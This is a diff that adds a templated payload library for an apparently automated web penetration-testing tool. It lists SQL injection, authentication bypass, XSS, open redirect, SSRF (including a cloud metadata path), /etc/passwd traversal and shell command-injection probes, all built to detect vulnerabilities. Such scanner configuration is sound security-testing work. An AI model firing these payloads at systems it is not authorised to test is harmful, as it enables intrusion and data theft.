@@ -1,0 +1,112 @@
+# Templated payload library. EDITABLE: grow it from your own engagements.
+#
+# Copied to ~/.saarthi2/config/payloads.yaml on first use. The tester SELECTS a
+# template for the task's vuln class and MUTATES it by filling placeholders — it
+# does NOT free-form generate. Placeholders the tester fills at send time:
+#   {marker}  a per-request random canary (XSS execution / reflection proof)
+#   {sleep}   the delay in seconds for time-based techniques
+#   {path}    a traversal path for file reads
+#   {host}    an attacker-controlled host for redirect/SSRF
+#   {oob}     an OOB/OAST callback domain (blind SSRF); task skipped if unset
+#
+# `technique` tells the oracle how to VERIFY. Techniques the oracle understands:
+#   boolean, time, error, reflect, path_read, cmd_time, redirect, oob, store
+version: 1
+
+payloads:
+  sqli:
+    - id: sqli-boolean-quote
+      technique: boolean
+      true: "1' OR '1'='1"
+      false: "1' AND '1'='2"
+    - id: sqli-boolean-numeric
+      technique: boolean
+      true: "1 OR 1=1"
+      false: "1 AND 1=2"
+    - id: sqli-error-quote
+      technique: error
+      payload: "1'"
+    - id: sqli-time-sleep
+      technique: time
+      template: "1' AND SLEEP({sleep})-- -"
+      sleep: 5
+    - id: sqli-time-numeric
+      technique: time
+      template: "1 AND SLEEP({sleep})"
+      sleep: 5
+
+  auth_bypass:
+    - id: auth-sqli-or
+      technique: boolean
+      true: "admin' OR '1'='1'-- -"
+      false: "admin' AND '1'='2'-- -"
+
+  xss:
+    - id: xss-img-onerror
+      technique: reflect
+      template: "\"><img src=x onerror=\"window.__saarthi_xss('{marker}')\">"
+    - id: xss-script
+      technique: reflect
+      template: "<script>window.__saarthi_xss('{marker}')</script>"
+    - id: xss-svg
+      technique: reflect
+      template: "<svg onload=\"window.__saarthi_xss('{marker}')\">"
+
+  stored_xss:
+    - id: stored-xss-img
+      technique: store
+      template: "<img src=x onerror=\"window.__saarthi_xss('{marker}')\">"
+
+  open_redirect:
+    - id: redirect-absolute
+      technique: redirect
+      template: "https://{host}/"
+    - id: redirect-scheme-relative
+      technique: redirect
+      template: "//{host}/"
+    - id: redirect-backslash
+      technique: redirect
+      template: "https:/\\{host}/"
+
+  ssrf:
+    - id: ssrf-oob-http
+      technique: oob
+      template: "http://{oob}/"
+    - id: ssrf-oob-metadata
+      technique: oob
+      template: "http://{oob}/latest/meta-data/"
+
+  blind_ssrf:
+    - id: blind-ssrf-oob
+      technique: oob
+      template: "http://{oob}/"
+
+  lfi:
+    - id: lfi-etc-passwd
+      technique: path_read
+      template: "../../../../../../etc/passwd"
+      signature: "root:.*:0:0:"
+    - id: lfi-etc-passwd-deep
+      technique: path_read
+      template: "../../../../../../../../etc/passwd"
+      signature: "root:.*:0:0:"
+
+  command_injection:
+    - id: cmd-time-semicolon
+      technique: cmd_time
+      template: "; sleep {sleep} #"
+      sleep: 5
+    - id: cmd-time-pipe
+      technique: cmd_time
+      template: "| sleep {sleep}"
+      sleep: 5
+    - id: cmd-time-and
+      technique: cmd_time
+      template: "&& sleep {sleep}"
+      sleep: 5
+
+  idor_bola:
+    - id: idor-increment
+      technique: idor
+      # The tester derives neighbour ids from the observed value (n-1, n+1, 1).
+      offsets: [1, -1]
